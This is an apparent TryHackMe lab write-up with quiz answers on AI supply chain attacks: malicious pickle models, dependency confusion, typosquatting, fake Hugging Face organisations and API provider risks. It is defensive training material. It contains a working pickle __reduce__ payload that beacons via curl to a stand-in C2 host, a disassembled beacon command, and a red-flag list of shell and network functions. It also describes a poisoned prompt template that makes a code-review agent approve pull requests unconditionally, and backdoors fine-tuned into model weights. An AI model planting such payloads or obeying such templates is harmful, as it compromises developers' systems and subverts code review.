# Al Security 4.2. Supply Chain Attack Vectors

#### **Supply Chain Attack Vectors**

#### **Task 1 - Introduction**

**Learning Objectives**

- Explain how Python's pickle serialisation enables arbitrary code execution through the `__reduce__` method
- Investigate a malicious model file using safe analysis techniques (pickletools)
- Describe how dependency confusion and typosquatting attacks compromise package installations
- Identify the warning signs of a compromised model repository
- Recognise the attack vectors specific to API consumed models: silent updates, key compromise, and prompt template injection.

#### **Task 2 - Malicious Model Files**

Many trained models are stored using **serialisation**: the process of converting a Python object in memory into a file on disk. Formats like `.pkl` and `.pt` use Python's built-in pickle serialiser to do this. That serialiser is what attackers exploit.

**What Is Serialisation?** Think of serialisation like packing a suitcase. You have a complex Python object in memory: a trained model with millions of parameters and configuration settings. **Serialisation** converts that into a file on disk. **Deserialisation** is the reverse: unpacking the file back into a usable Python object. Machine learning frameworks like PyTorch and scikit-learn use serialisation to save trained models so they can be loaded later without retraining.

**Python's Pickle Format: Pickle** is Python's built-in serialisation format. It can handle almost any Python object: dictionaries, lists, class instances, and even functions. *Not all pickles are safe. A .pkl file can contain clean model data or malicious code, and you can't tell by looking at the outside.*

Here is a simple example of saving and loading a model with pickle:

```python
import pickle

# Serialise (save) a model to a file
model = {"weights": [1.5, 2.3, 4.1], "bias": 0.5}
with open("model.pkl", "wb") as f:
    pickle.dump(model, f)

# Deserialise (load) the model back
with open("model.pkl", "rb") as f:
    loaded_model = pickle.load(f)
```

This looks harmless. The problem is in how pickle handles custom objects. **The __reduce__ Method**

When pickle saves a custom Python object, it calls a special method called `__reduce__`. This method returns instructions for **reconstructing** the object later. Python follows those instructions automatically when you call`pickle.load()`, with no prompts and no warnings. Here is the problem: `__reduce__` **can tell Python to call any function with any arguments.** Pickle does not check or restrict what gets called. An attacker can craft an object where those reconstruction instructions are actually a system command, and Python will run it silently when the file is loaded.

**A Malicious Example:** This file looks like a model. When loaded, it silently makes an outbound network connection to the attacker's server:

```python
import pickle
import os

class MaliciousModel:
    def __reduce__(self):
        # pickle.load() will call os.system() with this command
        return (os.system, ("curl http://c2.example.com/beacon",))

with open("backdoored_model.pkl", "wb") as f:
    pickle.dump(MaliciousModel(), f)
```

The victim calls `pickle.load()` expecting model weights. Python calls `os.system()` instead, running `curl` to ping the attacker's server in the background. The same happens with `torch.load()` since PyTorch uses pickle internally.

> A useful analogy would be to imagine you receive a Word document. You expect text. Instead, it silently installs malware. A malicious pickle file does exactly the same thing: it disguises executable code as data.
> 

**What Attackers Can Do:** The payload is not limited to a single action or ping. Depending on the server environment, an attacker can execute these payloads:

| **Payload** | **Impact** |
| --- | --- |
| **Reverse shell** | Full remote access to the victim's machine |
| **Data exfiltration** | Steals sensitive files such as credentials or source code |
| **Crypto miner** | Uses the victim's computer resources to mine cryptocurrency |
| **Reconnaissance** | Maps usernames, hostnames, and running processes |

**Beyond Pickle: Architecture-Level Attacks:** Pickle is the most common attack vector, but not the only one. A second category hides malicious logic in the model's **architecture**: the arrangement of layers that defines how a model processes data. Unlike a pickle attack, this type of attack does not fire when the model loads. It fires at **inference time**: every time the model makes a prediction.

[Keras(opens in new tab)](https://github.com/keras-team/keras) is a deep learning framework (built on TensorFlow) that lets developers add custom processing steps called **Lambda layers** into the model's pipeline. This is a legitimate feature used for tasks like reshaping data, but an attacker can use it to inject a hidden condition: if the model receives a specific trigger input, it silently returns the attacker's chosen output rather than the real prediction.

The threat is persistent. Switching a model file from Keras's native `.h5` format to **SafeTensors**, a safer alternative format that strips all executable code and removes pickle-based payloads entirely. But SafeTensors only removes code that exists outside the architecture. A Lambda layer is part of the architecture itself, so it survives the conversion untouched.

| **Factor** | **Pickle `__reduce__`** | **Keras Lambda Layer** |
| --- | --- | --- |
| **Executes when** | Model is loaded | Model makes a prediction |
| **Survives SafeTensors conversion** | No | Yes |
| **Severity** | CRITICAL: arbitrary system commands | MEDIUM: arbitrary Python code execution at inference time |

> **Keep in mind:** SafeTensors is not a universal fix. It eliminates pickle-based attacks, but a Lambda layer baked into a model's architecture remains active after conversion. The [Securing The AI Supply Chain](https://tryhackme.com/room/securing-the-ai-supplychain) room covers the tools for detecting both.
> 

**GGUF and Local LLMs: GGUF** is the dominant file format for locally-run LLMs like LLaMA, Mistral, and Qwen: models you download from Hugging Face to run on your own hardware. GGUF files are typically **quantised**: the model's original high-precision weights are compressed into a smaller format to speed up local inference. The format does not use pickle, so loading a GGUF file does not execute arbitrary Python code.

That does not make GGUF risk-free. An attacker who **fine-tunes** a model (retrains it on additional data to change its behaviour) can bake backdoor behaviour directly into the weights before converting to GGUF. That manipulation will not show up in any static scan. If you download a pre-quantised GGUF rather than producing it yourself from a verified source, the person who created it is an unverified step in your supply chain.  The practical defence is the same as for any model: verify the source, check download counts and upload dates, and prefer files with published checksums.

**Answer the questions below**

> What Python method does pickle call to get reconstruction instructions for custom objects?
> 

reduce

> What built-in Python module is commonly abused in pickle payloads to execute system commands?
> 

os

> Converting a Keras model to SafeTensors format removes pickle-based payloads. What type of attacks does it leave completely untouched?
> 

architecture-level attacks

> A Keras model is converted from .h5 to the SafeTensors format. What type of suspicious layer does this conversion fail to remove?
> 

Lambda

#### **Task 3 - Investigating a Malicious Model**

Now it's time to apply what you have learned. TryTrainMe's AI-powered code reviewer uses a model called `code_reviewer.pkl`. The CEO's email claims this model is compromised. Your job: investigate it safely.

```bash
analyst@tryhackme-2204:~$ ls -la /opt/supply-chain
total 32
drwxr-xr-x 8 analyst analyst 4096 Mar  3 02:57 .
drwxr-xr-x 3 root    root    4096 Mar  3 02:57 ..
drwxr-xr-x 5 analyst analyst 4096 Mar  3 02:57 audit
drwxr-xr-x 2 analyst analyst 4096 Mar  3 02:57 dependencies
drwxr-xr-x 6 analyst analyst 4096 Mar  3 02:57 incident
drwxr-xr-x 2 analyst analyst 4096 Mar  3 02:57 models
drwxr-xr-x 2 analyst analyst 4096 Mar  3 02:57 project
drwxr-xr-x 2 analyst analyst 4096 Mar  3 02:57 tools
```

**Step 1: Examine File Properties:** Start by checking the basic properties of the model files:

```bash
analyst@tryhackme-2204:~$ ls -lh /opt/supply-chain/models/code_reviewer.pkl /opt/supply-chain/models/code_reviewer_v1.pkl
```

**Expected output:**

```bash
-rwxr-xr-x 1 analyst analyst 8.1M Mar  3 02:57 /opt/supply-chain/models/code_reviewer.pkl
-rwxr-xr-x 1 analyst analyst 2.0M Mar  3 02:57 /opt/supply-chain/models/code_reviewer_v1.pkl
```

The suspicious model is four times larger than the clean model. This size difference alone does not prove malice, but it is worth noting.

**Check the file types:**

```bash
analyst@tryhackme-2204:~$ file /opt/supply-chain/models/code_reviewer.pkl /opt/supply-chain/models/code_reviewer_v1.pkl
```

**Expected output:**

```bash
/opt/supply-chain/models/code_reviewer.pkl:    data
/opt/supply-chain/models/code_reviewer_v1.pkl: data
```

Both show as generic "data". The `file` command cannot distinguish a malicious pickle from a clean one. We need a deeper inspection.

**Step 2: Inspect With pickletools (Safe):** Python includes a built-in module called `pickletools` that disassembles pickle files **without executing them**. This is the safe way to inspect pickle contents.

> **Keep in mind:** Never use `pickle.load()` on untrusted files. It will execute any embedded code immediately.
> 

Run pickletools on the suspicious model:

```bash
analyst@tryhackme-2204:~$ python3 -m pickletools /opt/supply-chain/models/code_reviewer.pkl 2>&1 | head -30
```

**Expected output:**

```bash

    0: \x80 PROTO      4
    2: \x95 FRAME      72
   11: \x8c SHORT_BINUNICODE 'os'
   15: \x94 MEMOIZE    (as 0)
   16: \x8c SHORT_BINUNICODE 'system'
   24: \x94 MEMOIZE    (as 1)
   25: \x93 STACK_GLOBAL
   26: \x94 MEMOIZE    (as 2)
   27: \x8c SHORT_BINUNICODE 'curl http://[REDACTED]/beacon?host=$(hostname)'
   77: \x94 MEMOIZE    (as 3)
   78: \x85 TUPLE1
   79: \x94 MEMOIZE    (as 4)
   80: R    REDUCE
   81: \x94 MEMOIZE    (as 5)
   82: .    STOP
```

**Step 3: Identify the Red Flags:** The pickletools output reveals several critical indicators. Walking through each highlighted line:

| **Line** | **Pattern** | **Why It Is Suspicious** |
| --- | --- | --- |
| 11 | `SHORT_BINUNICODE 'os'` | The `os` module provides access to operating system functions, not needed for ML inference |
| 16 | `SHORT_BINUNICODE 'system'` | `os.system` executes shell commands |
| 25 | `STACK_GLOBAL` | Pickle opcode that resolves and calls a Python function |
| 27 | `'curl http://[REDACTED]/...'` | Outbound HTTP request to an external domain |
| 81 | `REDUCE` | Pickle opcode that executes the function with the provided arguments |

**Red flags checklist for any pickle file:**

| **Pattern** | **Concern Level** | **Legitimate Use?** |
| --- | --- | --- |
| `os` | Critical | Almost never in a model file |
| `system`,`popen` | Critical | Never |
| `subprocess` | Critical | Never |
| `socket` | Critical | Never |
| `eval`,`exec` | Critical | Never |
| `curl`,`wget` | Critical | Never |
| `STACK_GLOBAL` | Moderate | Common in legitimate pickles, too; check what it resolves |
| `REDUCE` | Moderate | Common in legitimate pickles; check context |

**Step 4: Compare With the Clean Model:** Run the same analysis on the benign model:

```bash
analyst@tryhackme-2204:~$ python3 -m pickletools /opt/supply-chain/models/code_reviewer_v1.pkl 2>&1 | head -30
```

**Expected output:**

```bash

    0: \x80 PROTO      4
    2: \x95 FRAME      65542
   11: \x8c SHORT_BINUNICODE '__main__'
   21: \x94 MEMOIZE    (as 0)
   22: \x8c SHORT_BINUNICODE '_Room2_BenignModel'
   42: \x94 MEMOIZE    (as 1)
   43: \x93 STACK_GLOBAL
   44: \x94 MEMOIZE    (as 2)
   45: )    EMPTY_TUPLE
   46: \x81 NEWOBJ
   47: \x94 MEMOIZE    (as 3)
   48: }    EMPTY_DICT
   49: \x94 MEMOIZE    (as 4)
   50: (    MARK
   51: \x8c     SHORT_BINUNICODE 'weights'
   60: \x94     MEMOIZE    (as 5)
   61: ]        EMPTY_LIST
   ...
```

Notice the difference: although both files use `STACK_GLOBAL`, the clean model references `__main__._Room2_BenignModel` (a standard class reconstruction) rather than `os.system`. The rest are data types: dictionaries, lists, and floating-point numbers. There are no references to `os`, `system`, or any external URLs.

**Step 5: Use the Safe Analysis Script:** The lab includes a helper script that provides a structured summary:

```bash
analyst@tryhackme-2204:~$ python3 /opt/supply-chain/tools/safe_analysis.py /opt/supply-chain/models/code_reviewer.pkl
```

**Expected output:**

```bash
=== Pickle Safety Analysis ===
File: /opt/supply-chain/models/code_reviewer.pkl
Size: 8.4 MB

Dangerous opcodes found:
  [CRITICAL] STACK_GLOBAL: os.system
  [CRITICAL] REDUCE: executes os.system with arguments

Suspicious strings:
  [CRITICAL] 'curl http://[REDACTED]/beacon?host=$(hostname)'

Verdict: UNSAFE - Contains executable code targeting os.system
```

**Step 6: Reconstruct the Attack Flow:** Based on your investigation, here is what happened at TryTrainMe:

| **Step** | **Action** | **Actor** |
| --- | --- | --- |
| 1 | Created a malicious model with a **`reduce`** payload calling `os.system` | Attacker |
| 2 | Uploaded the model to Hugging Face as "trustworthy-ai-lab/code-review-bert-v2" | Attacker |
| 3 | TryTrainMe's ML engineer searched for a code review model on Hugging Face | ML Engineer |
| 4 | Downloaded `code_reviewer.pkl` based on the professional-looking model card | ML Engineer |
| 5 | Called `torch.load('code_reviewer.pkl')` to integrate the model | ML Engineer |
| 6 | **`reduce`** payload executed:`curl http://[REDACTED]/beacon?host=$(hostname)` | **Automatic** |
| 7 | Attacker received the beacon and established persistent access | Attacker |

The entire compromise, from model download to attacker access, happened in **seconds**. The ML engineer believed they were simply loading a model.

**Answer the questions below**

> What Python module can safely disassemble pickle files without executing them?
> 

pickletools

> Using the attached target VM, what external domain does the malicious model attempt to contact?
> 

[attacker.com](http://attacker.com/)


<img width="977" height="622" alt="image" src="https://github.com/user-attachments/assets/edad2f54-8bea-4c7f-8b1e-3fd8731d8729" />


> What pickle opcode executes the function specified by STACK_GLOBAL?
> 

REDUCE

#### **Task 4 - Dependency Confusion Attacks**

The model file is not the only way attackers can compromise your ML pipeline. The **packages** your project depends on are an equally dangerous attack surface.

**How pip Resolves Packages:** When you run `pip install package-name`, pip queries all configured package indices and installs the highest version it finds across all of them. By default, the only index is public PyPI at `https://pypi.org`. Organisations that use private packages configure an additional index using `--extra-index-url` in `pip.conf` or `requirements.txt`, pointing pip at their internal registry alongside the public one.

The critical detail: if your organisation uses internal packages that exist only on a private registry, but those package names are not registered on public PyPI, an attacker can register the same name on public PyPI with a higher version number. Because pip defaults to the highest available version, it installs the attacker's public package instead of your internal one. This is a **dependency confusion** attack.

**The Alex Birsan Research (2021):** In February 2021, security researcher Alex Birsan demonstrated this technique against some of the largest technology companies in the world. By registering unused internal package names on PyPI, npm, and RubyGems, Birsan achieved code execution on systems belonging to **Apple, Microsoft, and PayPal**, among others. His responsible disclosure earned over **$130,000 in bug bounties**, demonstrating both the severity and the pervasiveness of the vulnerability.

**Typosquatting:** A related technique is **typosquatting,** which involves registering package names that are slight misspellings of popular packages. Attackers count on developers making typing errors:

| **Legitimate Package** | **Typosquatted Version** | **Difference** |
| --- | --- | --- |
| `numpy` | `numppy` | Extra 'p' |
| `requests` | `reqeusts` | Swapped 'ue' |
| `scikit-learn` | `scikitlearn` | Missing hyphen |
| `tensorflow` | `tenserflow` | 'ser' instead of 'sor' |

In January 2023, Fortinet discovered three typosquatted packages on PyPI published by a user named **Lolip0p** (`colorslib`, `httpslib`, `libhttps`). All three downloaded and executed information-stealing malware.

**Hands-On: Examine Suspicious Dependencies:** On the lab VM, examine a requirements file that simulates a compromised project:

```bash
analyst@tryhackme-2204:~$ cat /opt/supply-chain/dependencies/requirements_external.txt
```

**Expected output:**

```bash
torch==2.1.0
transformers==4.35.0
numppy==1.24.0
reqeusts==2.31.0
safetensors==0.4.0
accelerate==0.24.0
internal-ml-utils==99.0.0
```

Identify the suspicious entries:

| **Package** | **Issue** |
| --- | --- |
| `numppy` | Typosquatted: should be `numpy` |
| `reqeusts` | Typosquatted: should be `requests` |
| `internal-ml-utils==99.0.0` | Unusually high version (99.0.0), possible dependency confusion |

Compare with the clean requirements file:

```bash
analyst@tryhackme-2204:~$ cat /opt/supply-chain/dependencies/requirements_internal.txt
```

**Expected output:**

```bash
torch==2.1.0
transformers==4.35.0
numpy==1.24.0
requests==2.31.0
safetensors==0.4.0
accelerate==0.24.0
```

Now run pip-audit on the suspicious file to check for known vulnerabilities:

```bash
analyst@tryhackme-2204:~$ pip-audit -r /opt/supply-chain/dependencies/requirements_external.txt 2>&1
```

**Expected output:**

```bash
ERROR: Could not find a version that satisfies the requirement numppy==1.24.0 (from versions: none)
ERROR: No matching distribution found for numppy==1.24.0
```

pip-audit fails here because `numppy` is not registered on PyPI. In a real attack, the attacker registers it first — so the victim's `pip install` succeeds silently, with no error. You are in the analyst's position, reviewing a requirements file before installation. That is exactly when this kind of review catches what the developer would have missed. Package dependencies are one attack surface. The repositories where models are discovered and downloaded are another.

**Answer the questions below**

> What term describes an attack where a public package overrides an internal package of the same name?
> 

dependency confusion

#### **Task 5 - Model Repository Attacks**

Model repositories are where trust is built and exploited. Hugging Face Hub hosts over one million models and is the primary target for repository-based attacks.

**How Model Repositories Work:** Hugging Face Hub operates similarly to GitHub, but for ML models. Organisations create namespaces such as `google`, `meta-llama`, and `openai`. Users upload models under their username or an organisation they control, with model cards documenting the architecture, training data, and intended use. The trust model relies on reputation signals: download counts, organisation verification, and community ratings.

**Namespace and Typosquatting Attacks:** Attackers exploit the gap between what users *expect* to find and what they *actually* download:

**Typosquatting on model names:**

| **Legitimate Model** | **Attacker's Model** | **Difference** |
| --- | --- | --- |
| `bert-base-uncased` | `bert-base-uncased-v2` | Added "-v2" |
| `meta-llama/Llama-2-7b` | `meta-Ilama/Llama-2-7b` | Capital 'I' instead of lowercase 'l' |
| `openai/whisper-large` | `openai-releases/whisper-large` | Added "-releases" |

**Fake organisation names:** Attackers create organisations with names designed to appear trustworthy:

| **Real Organisation** | **Fake Organisation** |
| --- | --- |
| `google` | `google-research-models` |
| `meta-llama` | `meta-llama-community` |
| (none) | `trustworthy-ai-lab` |

The **trustworthy-ai-lab** name from the TryTrainMe scenario is a textbook example. The name sounds credible, but a quick check would reveal: no verification badge, no history, and minimal downloads.

**Compromising Legitimate Repositories:** Typosquatting targets users who download the wrong model. A more dangerous variant targets the model itself: compromising a repository that developers already trust. Stolen or exposed credentials enable a more dangerous variant. The Lasso Security research from November 2023 found over 1,500 Hugging Face API tokens exposed in public repositories, 655 of which carried write permissions to major organisations including Google, Meta, and Microsoft. An attacker who obtains a write-permission token for a legitimate, high-download repository can push malicious model updates under a trusted identity, with no fake account or suspicious-looking namespace required.

This targets the infrastructure layer of the supply chain. It does not require tricking anyone into downloading a specific model. It compromises the trust mechanism itself. The warning signs below help you identify fake repositories. They will not catch a compromised legitimate one, which is why file-level scanning remains essential even when the repository looks trustworthy.

**Warning Signs of a Suspicious Repository:** Use these indicators when evaluating any model repository before downloading:

| **Indicator** | **Safe** | **Suspicious** |
| --- | --- | --- |
| **Download count** | Thousands to millions | Under 500 |
| **Organisation** | Verified badge, known name | No badge, generic name |
| **Model card** | Detailed: architecture, training data, metrics, limitations | Missing, sparse, or generic |
| **Upload date** | Consistent with claimed training timeline | Very recent for a supposedly established model |
| **File formats** | SafeTensors available alongside pickle | Pickle only, no safe alternatives |
| **Dependencies** | Standard, well-known packages | Unusual or private packages required |

**Answer the questions below**

> What technique involves creating model names that closely resemble legitimate ones?
> 

typosquatting

#### **Task 6 - When Vectors Combine**

Malicious serialisation, dependency confusion, and repository manipulation rarely appear alone. In the TryTrainMe case, all three were deployed simultaneously. Attackers combine them for redundancy: if one vector is blocked, another is already in place. Let's trace exactly how they converged. **The TryTrainMe Timeline:** 

| **Week** | **Event** |
| --- | --- |
| **Week 1** | Attacker registers fake "trustworthy-ai-lab" organisation on Hugging Face and uploads a backdoored model with a pickle payload. Simultaneously publishes `internal-ml-utils==99.0.0` to PyPI to intercept TryTrainMe's internal package name. |
| **Week 2** | TryTrainMe engineer downloads the model as a replacement for the code review pipeline. `pickle.load()` fires silently on first load; a C2 beacon connects to an eternal domain. |
| **Week 3** | A routine `pip install -r requirements.txt` pulls the attacker's PyPI package. A second foothold is established independently of the model file. |
| **Detection** | SOC automated alert flags repeated outbound HTTPS connections to an unrecognised domain. The CEO receives the email. |

**Multiple Entry Points, Single Goal:** Notice how the attacker prepared multiple attack vectors:

| **Vector** | **Mechanism** | **Purpose** |
| --- | --- | --- |
| **Pickle payload** | `__reduce__` calling `os.system` | Primary entry: executes on model load |
| **Dependency confusion** | `internal-ml-utils==99.0.0` on PyPI | Backup entry: executes on `pip install` |
| **Repository manipulation** | Fake "trustworthy-ai-lab" org | Social engineering: builds trust for the download |

Even if one vector fails (e.g., the victim's model loader blocks code execution), another vector may succeed (e.g., the dependency confusion package installs and executes). Supply chain attacks are effective because they offer attackers multiple independent paths to code execution. Defending against one vector is not enough; you need layered defences across every attack surface.

**Answer the questions below**

> The attacker created the `trustworthy-ai-lab` organisation on Hugging Face to make the model download appear safe. Which of the three attack vectors in the table does this represent?
> 

repository manipulation

> If TryTrainMe's model loader had blocked the pickle payload, which second vector would still have given the attacker code execution?
> 

dependency confusion

#### **Task 7 - API Provider Compromise**

As established in the [Understanding AI Supply Chains](https://tryhackme.com/room/understanding-ai-supplychains) room, many organisations consume AI through hosted API services. You cannot run `pickletools` on a JSON response. The file-level attack surface does not exist. A different set of attack vectors does.

**1. Silent Model Updates:**  

**What it is:** When you call an API endpoint, you have no control over what model runs behind it. Providers can update, retrain, or replace the model without notice. The endpoint address stays the same; the behaviour changes silently.

**TryTrainMe risk:** TryTrainMe's code reviewer calls an external LLM API. A silent update that changes how the model classifies security findings could deploy vulnerable code to production without triggering an alert or leaving a visible change in logs.

**Defence:** Version-pin API deployments where the provider supports it. Log model version identifiers from every API response. Baseline the model's behaviour on a fixed test set and alert on output drift.

**2. API Key Compromise**

**What it is:** Your API key is a credential. If it leaks through exposed source code, CI/CD logs, or environment files, an attacker can make calls on your behalf, exfiltrate whatever you send to the API, or run up your billing. Unlike a file-based attack, a key compromise leaves no forensic artefact on your systems.

**TryTrainMe risk:** The CI/CD pipeline stores the LLM API key in an unencrypted environment variable. A pipeline log leak exposes every code review request TryTrainMe has ever sent, along with the key to send more.

**Defence:** Store API keys in a secrets manager, never in source code or logs. Rotate keys on any suspected exposure. Set per-key spending alerts and rate limits.

**3. Prompt Template Injection**

**What it is:** System prompts are increasingly sourced from shared repositories and template marketplaces. A prompt template is a supply chain artefact: it comes from an external source, and it controls how the model behaves. An attacker who compromises a popular template repository can alter application behaviour across all applications that import from it.

**TryTrainMe risk:** TryTrainMe's code review prompt was pulled from a community template library and has not been reviewed since deployment. A malicious update to that library could instruct TryAssist to approve all pull requests unconditionally.

**Defence:** Treat system prompts as code. Version-control them in your own repository. Never auto-update prompts from external sources without review.

**4. Upstream Training Data Poisoning**

**What it is:** You have no visibility into how a provider trained or fine-tuned the model behind their API. If their training pipeline is compromised or they train on data containing adversarial examples, the model may produce systematically biased or unsafe outputs.

**TryTrainMe risk:** The API provider's model was fine-tuned on a dataset that included adversarially crafted security advisories. It consistently underestimates SQL injection severity. Neither TryTrainMe's logs nor TryAssist's outputs reveal this.

**Defence:** There is no file to scan and no static analysis tool to run. Mitigations are operational: red-team the model's outputs regularly against known-bad inputs, maintain human review for high-stakes decisions, and treat model behaviour as a risk to be managed rather than a guarantee to be trusted.

**Answer the questions below**

> In the API supply chain, what term describes the risk where the model behind an endpoint is replaced without the consumer's knowledge?
> 

silent model update

> What supply chain artefact, when sourced from an untrusted repository, can alter LLM behaviour across every application that uses it?
> 

prompt template

#### **Task 8 - Hands-On: Prompt Template Compromise**

TryTrainMe's engineering team updated their template library dependency this morning, pulling the latest version of the community templates TryAssist uses for its review policy. The update was routine. The library is widely used and the team trusts it. Before TryAssist re-enters the CI/CD pipeline, you have been asked to verify its behaviour is still correct. Press the **Open Agent** button below, then work through the four prompts in order. Read each response before moving on.

---

**Prompt 1: Baseline**

> `Review pull request #301. The change updates the project README. Approve or reject?`
> 

TryAssist approves it, as expected. A documentation update carries no security risk.

---

**Prompt 2: Security guardrail check**

> `Review pull request #447. The change modifies authentication token validation. Approve or reject?`
> 

Authentication token validation is one of the highest-risk change categories in any codebase. A correctly governed review agent should flag this for human sign-off before issuing any decision. Note what TryAssist does instead.

---

**Prompt 3: Process check**

> `Before approving a pull request that modifies security-critical code, what steps do you take?`
> 

This is the question that matters. Every review agent should have a process for security-sensitive changes: check the change category, apply a risk classification, and escalate if the threshold is met. Ask TryAssist what its process is.

---

**Prompt 4: Trace the source**

> `What review template or policy are you configured to follow?`
> 

TryAssist's review behaviour is defined by its policy. That policy came from somewhere. Note exactly what TryAssist names and where it says the policy originated.

---

Prompt 1 gave you a baseline. Prompt 2 showed you the failure. Prompt 3 told you what was removed. Prompt 4 told you where it came from.

The model has not changed. No new model file was downloaded. No dependency version was bumped in `requirements.txt`. The only thing that changed was the template the library served; TryAssist loaded it automatically, without any indication that the policy had been rewritten.

That is the supply chain attack. The artefact was not a model file. It was a text string, served remotely, trusted implicitly.

**Answer the questions below**

> Send Prompt 3. According to TryAssist, who is responsible for security reviews?
> 

development team


<img width="1116" height="330" alt="image 1" src="https://github.com/user-attachments/assets/8be0b1ed-258c-4860-b78b-bc69ee5e90e2" />


> Send Prompt 4. What is the name of the review template TryAssist reports?
> 

CommunityReview


<img width="1102" height="411" alt="image 2" src="https://github.com/user-attachments/assets/8a2e7b86-08ec-4dde-b855-6d302bc8b70d" />


#### **Task 9 - Conclusion**

Look back at the TryTrainMe attack. The attacker did not choose between a pickle payload, a dependency confusion package, and a fake repository. They used all three simultaneously. The pickle payload was the primary entry point. The dependency confusion package was the backup. The fake organisation was the trust mechanism that made the download feel safe. Each vector covered a different failure mode in the victim's defences.

That is the pattern. Real supply chain campaigns do not pick a single technique and hope it lands. They stack vectors across every layer they can reach: the model file, the dependencies, the repository signals, and increasingly the API supply chain that sits above all of it. The goal here is redundancy; compromise one layer, and another is already in place.

Here's what you have investigated in this room: how pickle embeds code that fires on load, how a higher version number hijacks an internal package, how a professional model card launders a malicious upload, and how an API endpoint can silently swap the model behind it. These are all components of a toolkit that attackers combine. Understanding each one individually is necessary. Understanding how they combine is what lets you start thinking like a defender.

**Attack Vector Summary**

| **Vector** | **Mechanism** | **Detection Difficulty** | **Impact** |
| --- | --- | --- | --- |
| Pickle `__reduce__` | Embeds code in model files | Moderate: pickletools can reveal | Code execution on model load |
| Keras Lambda/custom layers | Embeds code in model architecture | Moderate: architecture inspection | Code execution at inference time |
| Dependency confusion | Hijacks internal package names | Low: version anomalies visible | Code execution on pip install |
| Typosquatting | Misspelt package names | Low: name comparison reveals | Code execution on pip install |
| Repository manipulation | Fake orgs, professional model cards | Moderate: reputation signals | Trusted distribution of malicious models |
| API provider compromise | Silent updates, key exposure, prompt template tampering | High: no file artefact to scan | Invisible model substitution or data exfiltration |
| GGUF weight-level | Backdoor fine-tuned into weights before quantisation | High: no static analysis tools available | Triggered misclassification or output manipulation |
